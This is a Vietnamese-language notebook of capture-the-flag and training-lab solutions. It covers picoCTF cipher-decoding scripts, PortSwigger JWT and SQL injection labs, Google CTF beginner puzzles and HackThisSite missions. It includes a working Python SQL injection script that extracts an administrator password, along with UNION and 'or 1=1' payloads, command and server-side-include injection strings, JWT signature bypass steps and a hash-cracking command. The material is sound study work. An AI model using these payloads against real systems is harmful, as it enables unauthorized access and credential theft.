# Cryptography  
## picoCtf
### substitution0 https://play.picoctf.org/practice/challenge/307?page=1&search=substitu
Cách giải: 
- Đây là mật mã thay thế.
- 26 kí tự đầu tiên sẽ là khóa.

```
from string import *
with open("message.txt") as file:
   content = file.read()
upper_key = "QWITJSYHXCNDFERMUKGOPVALBZ"
lower_key = upper_key.lower()
for character in content:
    if character.isupper():
        print(ascii_uppercase[upper_key.index(character)],end = "")
    elif character.islower():
        print(ascii_lowercase[lower_key.index(character)],end = "")
    else: 
        print(character,end = "")
```
### basic-mod2
```
import string
flag = []
with open('message.txt','r') as file:
    content = file.read()
    number = [int(val) for val in content.split()]
    module = [pow(i,-1,41) for i in number]  pow dùng để tìm nghịch đảo.
    for i in module:
        if i in range(1,27):
            flag.append(string.ascii_uppercase[i-1])
        elif i in range(27,37):
            flag.append(string.digits[i-27])
        else: 
            flag.append("_")
print("picoCTF{%s}" %"".join(flag))
```

### basic-mod1 

```
import string
flag = []
with open('message.txt','r') as file:
    content = file.read()
    number = [int(val) for val in content.split()]
    module = [i%37 for i in number]
    for i in module:
        if i in range(0,26):
            flag.append(string.ascii_uppercase[i])
        elif i in range(26,36):
            flag.append(string.digits[i-26])
        else: 
            flag.append("_")
print("picoCTF{%s}" %"".join(flag))
```
### rail-fence
- `https://www.geeksforgeeks.org/rail-fence-cipher-encryption-decryption/`
```
def decryptRailFence(cipher, key):
	rail = [['\n' for i in range(len(cipher))]
				for j in range(key)]
	dir_down = None
	row, col = 0, 0
	for i in range(len(cipher)):
		if row == 0:
			dir_down = True
		if row == key - 1:
			dir_down = False
		rail[row][col] = '*'
		col += 1
		if dir_down:
			row += 1
		else:
			row -= 1
	index = 0
	for i in range(key):
		for j in range(len(cipher)):
			if ((rail[i][j] == '*') and
			(index < len(cipher))):
				rail[i][j] = cipher[index]
				index += 1
	result = []
	row, col = 0, 0
	for i in range(len(cipher)):
		if row == 0:
			dir_down = True
		if row == key-1:
			dir_down = False
		if (rail[row][col] != '*'):
			result.append(rail[row][col])
			col += 1
		if dir_down:
			row += 1
		else:
			row -= 1
	return("".join(result))
if __name__ == "__main__":
	with open("message.txt","r") as file:
		content = file.read()
	flag = (decryptRailFence(content, 4))
	print("picoCTF{%s}" % flag[13:])
```
# Web   
## portwSwigger
### JWT.
#### Lab: JWT authentication bypass via flawed signature verification
- lỗi ở đây là ở phần signature content. Chuyển thuật toán ở phần header thành none sau đó xóa phần content signature đi nhưng vẫn phải dữ lại dấu chấm.
#### Lab: Lab: JWT authentication bypass via unverified signature
- chỉ cần thay đổi username thành administrator ở phần jwt là có thể đăng nhập vào như admin.
#### Lab: Lab: JWT authentication bypass via weak signing key
- thay đổi serect key của jwt bằng `serect1`
### SQL Injection - Lab #9 SQL injection attack, listing the database contents on non Oracle databases
- https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
1. Xác định số cột của database: ' order by 1--
- https://0a2200c8030727a2c633e1d0005c006d.web-security-academy.net/filter?category=Accessories%27%20order%20by%201--
- Tăng số lần lượt từ 1 cho đến khi web trả về lỗi. Từ đó xác định được số cột trong database.(2 cột)
2. Xác định kiểu dữ liệu của cột.
- ' UNION select 'a',NULL-- 
- ' UNION select 'a','a'--
- -> cả hai cột dữ liệu là kiểu text.
3. Xác định phiên bản của database.
- ' UNION select version(),NULL--       =>PostgreSQL
4. Lấy được danh sách tên cột của database.
- ' UNION select table_name, NULL FROM  information_schema.tables--
- (lên mạng gõ information_schema.tables sau đó tìm ra được table_name)  
5. In ra tên của bảng.
- ' UNION select column_name, NULL FROM  information_schema.columns WHERE table_name = 'users_wahylc'--
- (users_wahylc tùy thuộc vào từng bài).
- password_qlrxps     username_msmtmu
6. In ra username và password.
- ' UNION select username_msmtmu, password_qlrxps from users_wahylc--
- administrator   c05fnpuhr9l97equdrn2
```
 import requests 
 import urllib3
 from bs4 import BeautifulSoup
 import re  
 import sys 
 import warnings
 warnings.filterwarnings("ignore", category=DeprecationWarning) 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {'http': 'http://127.0.0.1:8080','https' : 'https://127.0.0.1:8080'}
 def perform_request(url,sql_payload):
     path = '/filter?category=Accessories'
     r = requests.get(url + path + sql_payload,verify = False,proxies = proxies)
     return r.text 
 def sqli_users_table(url):
     sql_payload = "' UNION select table_name, NULL FROM  information_schema.tables--"
    res = perform_request(url,sql_payload)
    soup  = BeautifulSoup(res,'html.parser')
    users_table = soup.find(text = re.compile(".*users.*"))
    if users_table: 
        return users_table
    else: 
        return False 
def sqli_users_columns(url,users_table): 
    sql_payload = "' UNION select column_name, NULL FROM  information_schema.columns WHERE table_name = '%s'--" %users_table
    res = perform_request(url,sql_payload)
    soup = BeautifulSoup(res,'html.parser')
    username_column = soup.find(text = re.compile('.*username.*'))
    password_column = soup.find(text = re.compile('.*password.*'))
    return username_column,password_column
 def sqli_administrator_cred(url,users_table,username_column,password_column):
    sql_payload = "' UNION select %s, %s from %s--" % (username_column,password_column,users_table)
    res = perform_request(url,sql_payload)
    soup = BeautifulSoup(res,'html.parser')
    admin_password = soup.body.find(text = "administrator").parent.findNext('td').contents[0] 
    return admin_password
 if __name__ == "__main__":
    try: 
        url = sys.argv[1].strip()
    except IndexError: 
        print("[-] Usage: %s <url>" %sys.argv[0])
        print("[-] Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)
    print("Looking for a users table....")
    users_table = sqli_users_table(url)
    if users_table:
        print("Found the users table name: %s" %users_table)
        username_column,password_column = sqli_users_columns(url,users_table)
        if username_column and  password_column:
            print("Found the username column name: %s", username_column)
            print("Found the password column name: %s", password_column)
            admin_password = sqli_administrator_cred(url,users_table,username_column,password_column)
            if admin_password: 
                print("[+] The administrator password is: %s" %admin_password) 
            else: 
                print("[-] Did not find the administrator password.")
        else: 
            print("Did not find the username and/ or the password columns.")
    else: 
        print("Did not find a users table.")
```
## Google Ctf
### 1. Vienna - Chemical plant 
- https://capturetheflag.withgoogle.com/beginners-quest
Hàm array.from trong js có tác dụng biến đổi string thành mảng của các kí tự.
Hàm array.map() có tác dụng biến đổi các phần tử của mảng.
vd: array.map(x => x * x): bình phương tất cả các phần tử của mảng.
```
p = [0] * 12
offset = "0xcafe"
p[0] =  52037
p[6] = 52081
p[5] = 52063 
p[1] = 52077 
p[9] = 52077 
p[10] = 52080 
p[4] = 52046 
p[3] = 52066 
p[8] = 52085 
p[7] = 52081 
p[2] = 52077 
p[11] = 52066 
password = []
for x in p: 
   password.append(chr(x - int(offset,16)))
print("".join(password))
```
### 2. Prague - Apartment
- Sử dụng các cổng logic.
### 3. Prague - Streets
```
var carArray = scanArray;
var max = 0;
for(var i = 1;i < carArray.length;i++){
     if(max < carArray[i]){
         max = carArray[i];
     }
}
var leftSide = carArray.slice(0,7);
var rightSide = carArray.slice(10,17);
var left = 0;
var right = 0;
for(var i = 0;i<leftSide.length;i++){
      if(leftSide[i] == max){
           left+=1;
      }
}
for(var i = 0;i<rightSide.length;i++){
      if(rightSide[i] == max){
           right+=1;
      }
}
if( left > 0){
       return -1;
}
if(right > 0){
      return 1;
}
return 0;
```

### 4. Secret Location - Base
- gpio_set_mask(67) : có tác dụng set các bit lên 1. sử dụng &
- gpio_clr_mask(0): có các dụng loại tất cả các bit về mask 0. sử dụng | ~

```
gpio = 0
def gpio_clr_mask(m):
    global gpio
    gpio &= ~m
def gpio_set_mask(m):
    global gpio 
    gpio |= m
def sleep_us(_):
    print(chr(gpio),end = "") 
```

### 5. Istanbul - Bazaar

- '\n'.join(arr)   có tác dụng kết hợp các phần tử của mảng lại và viết theo dòng, do có \n.  
- random.getrandbits(k). Returns a non-negative Python integer with k random bits. This method is supplied with the `MersenneTwister` generator
- MersenneTwister. `https://github.com/eboda/mersenne-twister-recover`

```
from MTRecover import MT19937Recover
from robo import arr
mtr = MT19937Recover()
r2 = mtr.go(arr)
def encodeSecret(s):
    key = [r2.getrandbits(8) for i in range(len(s))]
    return bytes([a^b for a,b in zip(key,s)])
with open("secret.enc","rb") as f: 
    s = f.read()
print(encodeSecret(s))

```
### 7. Buenos Aires - Conference
- When encrypting with low encryption exponents (e.g., e = 3) and small values of the m (i.e., m < n1/e), the result of me is strictly less than the modulus n. In this case, ciphertexts can be decrypted easily by taking the eth root of the ciphertext over the integers. `https://en.wikipedia.org/wiki/RSA_(cryptosystem)`

```
def nth_root(x, n):
    # Start with some reasonable bounds around the nth root.
    upper_bound = 1
    while upper_bound ** n <= x:
        upper_bound *= 2
    lower_bound = upper_bound // 2
    # Keep searching for a better result as long as the bounds make sense.
    while lower_bound < upper_bound:
        mid = (lower_bound + upper_bound) // 2
        mid_nth = mid ** n
        if lower_bound < mid and mid_nth < x:
            lower_bound = mid
        elif upper_bound > mid and mid_nth > x:
            upper_bound = mid
        else:
            # Found perfect nth root.
            return mid
    return mid + 1

for k in range(5000):
    r = nth_root(c + k * n,3)
    l = hex(r)[2:] #     bỏ hai kí tự 0x ở đầu đi 
    if len(l) % 2 == 1:
        l = "0" + l 
    m = b''.fromhex(l)   #    b''.fromhex(l) = bytes.fromhex(l)
    if b'CTF' in m: 
        print(m)
        break
```


## Hackthissite 
- `https://www.hackthissite.org/`
### 1. Basic1
- Vô phần sourcecode tìm mật khẩu.
### 2. Basic2
- Gửi mật khẩu rỗng.
### 3. basic3
- Vô phần sourcecode và thấy phần password.php, chuyển hướng đến trang đấy.
### 4. basic4
- Vô phần sourcecode và thấy đoạn form dùng để gửi mật khẩu qua email, thay đổi email thành email của mình và thay đổi phần action thành link của trang web.
```
<form action="https://www.hackthissite.org/missions/basic/4/level4.php" method="post">
    <input type="hidden" name="to" value="2152809@gm.uit.edu.vn" /><input type="submit" value="Send password to Sam" />
</form>

```
### 5. basic5 
- inspect code và thực hiện thay đổi email ngay ở đó.
93af03f
### 6. basic6
```
s = '94ci48l:'
pas = ""
for i,c in enumerate(s):
    pas += chr(ord(str(c)) - int(i))
print(pas)
```
### 7. basic7
- Cách sử dụng hai câu lệnh linux cùng lúc trên cùng một dòng (câu lệnh thứ nhất; câu lệnh thứ hai. ví du: 2021;ls)(os command injection)
- Sử dụng os command injection `;ls`, nhìn thấy được các thư mục, truy cập vào thư mục cuối cùng sẽ được mật khẩu.
### 8. basic8
- server side include. `<!--#exec cmd="ls"-->` `<!--#exec cmd="ls .."-->`
### 9. basic9 
- thực hiện ở basic8. `<!--#exec cmd="ls ../../9"-->`
### 10. basic10
- Thay đổi giá trị của cookies từ no thành yes.
### 1. Application challenge 1
- Chuyển file app1win.exe về dạng string `strings app1win.exe > 1.txt`
- Sau khi nhập mật khẩu sai thì sẽ được một dòng chữ, tìm dòng chữ đó trong file 1.txt thì sẽ thấy `0Contratulations! The password to this level is '`. Nhập lần lượt các mật khẩu vào và nhận được mật khẩu cuối cùng là `smashthestate`

### 1. javascript 1
- Vào phần source code và thấy có hàm check() javascript dùng để kiểm tra mật khẩu.
### 2. javascript 2
- disable javascript.
### 3. javascript 3
- Tính toán.
### 4. javascript 4
- Thực hiện alert(""+RawrRawr+"") trên browser để xem giá trị của mật khẩu.
### 5. javascript 5
- unescape trong js có tác dụng chuyển hex sang string.
### 7. javascript 7
- Chuyển từ hex sang string.
```
array = [chr(c) for c in x]
print("".join(array))
```
### 1. Over and over.
- buffer overflow, nhập vào chuỗi có 201 ký tự sẽ làm bộ nhớ bị tràn.
### 2. Extension blocking.
- CSRF, `../../index`
### 6. Sucky sysadmin. 
- `http://moo.com/moo.php?pass=TRUE`
### 7. extended basic 7.
- `<form name="grezvahfvfnjuvavatovgpu" action="<?=htmlspecialchars($_SERVER['PHP_SELF'])?>" method="post">`
### 8. extended basic 8.
- `if ($User eq 'BillGates')`
### 9. extended basic 9.
- `open(STARTREKLOG, '>>/var/log/startrek');`
### 10. extended basic 10.
- `"=="" set passwordvalue=1065435274 && goto :end whatever`
### 12.extended basic 12.
- `moo.com/any.php?userpass=value&password=value`
### 13. extended basic 13.
- `vrfy.php?name=&email=`
### 14. extended basic 14.
- `private synchronized void incrementLeetness() {`

### 2. realistic 2.
- sql injection. `admin' or 1=1--`
### 3. realistic 3.
- Trong phần sourcecode của trang web có dòng chữ. Chuyển sang oldindex.html, vào phần submit poem, submit với nội dung là sourcecode của trang web và tên là `../index.html`
### 4, realistic 4.
- sql injection. `union all select null,*,null,null from email;`
### 5.realistic 5.
- Đầu tiên vào file robots.txt, sau đó vào thư mực secret và có file admin.bak.php và có một dòng hash được sử dụng thuật toán hash MD4, giải mã hash đó bằng cách sử dụng câu lệnh `sudo john --format=Raw-MD4 hash.txt` trong đó hash.txt chứa mã hash.
### 6. realistic 6.
- Sử dụng thuật toán XEcryption algorithm, sau đó gửi vô phần thông tin cá nhân của bản thân, nhấn vào username và tiến hành gửi mail.
### 7. realistic 7.

## RUSH CTF.
- `https://rush.ctf.cafe/challenges`
### missing y00u.
```
flag = []
for i in range(2,len(s),4):
    flag.append(chr(int(s[i:i+2],16)))
print("".join(flag))
```

## Security valley.
- `https://ctf.securityvalley.org/`
### Simple ELF
- `strings crackme-01 | grep SecVal`
### Capture message.
- Rotation.
### shell.
- TCP stream.
### the data.
- file-> export object -> preview.

### overthewire
## 1.bandit1.
- `ssh bandit0@bandit.labs.overthewire.org -p 2220`
## 2. bandit2.
- pwd->ls->cat readme `NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL`
## 3. bandit3.
- 